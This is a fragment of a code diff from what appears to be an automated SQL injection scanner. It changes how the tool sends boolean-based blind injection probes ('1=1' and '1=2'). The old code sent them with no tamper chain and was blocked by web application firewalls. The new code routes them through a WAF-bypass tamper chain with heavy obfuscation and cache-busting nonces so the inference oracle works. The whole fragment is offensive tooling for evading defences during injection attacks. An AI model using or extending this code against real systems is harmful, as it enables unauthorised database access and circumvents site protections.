@@ -56144,29 +56144,16 @@ class Scanner:
                                 # with unique cache-busting URL nonces so CDN serves fresh
                                 # responses and true/false bodies can diverge as the oracle needs.
                                 try:
-                                    _bsl_nonce_t = random.randint(1000000, 9999999)
-                                    _bsl_nonce_f = random.randint(1000000, 9999999)
-                                    _bsl_url_t = (enum.url
-                                                  + ("&" if "?" in enum.url else "?")
-                                                  + f"_inf_t={_bsl_nonce_t}")
-                                    _bsl_url_f = (enum.url
-                                                  + ("&" if "?" in enum.url else "?")
-                                                  + f"_inf_f={_bsl_nonce_f}")
-                                    _bsl_p_t = (_template.replace("[INFERENCE]", "1=1")
-                                                + _original_comment_marker)
-                                    _bsl_p_f = (_template.replace("[INFERENCE]", "1=2")
-                                                + _original_comment_marker)
-                                    _fp_bsl_t = await asyncio.wait_for(
-                                        _send_injected(
-                                            enum.engine, enum.method, _bsl_url_t, enum.data,
-                                            enum.data_fmt, _det.param, _bsl_p_t, []),
-                                        timeout=15)
+                                    # Use _send_payload() so the full _extract_chain WAF-bypass tamper
+                                    # chain + heavy obfuscation + cache-busting nonces are applied.
+                                    # Prior code called _send_injected() with [] empty tamper chain,
+                                    # causing WAF to block both TRUE and FALSE probes → identical 4xx
+                                    # responses → sim_t == sim_f → gap=0.000 → oracle never activates.
+                                    _fp_bsl_t, _ = await asyncio.wait_for(
+                                        _send_payload("1=1"), timeout=15)
                                     await asyncio.sleep(1.0)
-                                    _fp_bsl_f = await asyncio.wait_for(
-                                        _send_injected(
-                                            enum.engine, enum.method, _bsl_url_f, enum.data,
-                                            enum.data_fmt, _det.param, _bsl_p_f, []),
-                                        timeout=15)
+                                    _fp_bsl_f, _ = await asyncio.wait_for(
+                                        _send_payload("1=2"), timeout=15)
                                     _norm_t = (ResponseNormaliser.normalise(
                                                    _extract_body_safe(_fp_bsl_t))
                                                if (_fp_bsl_t
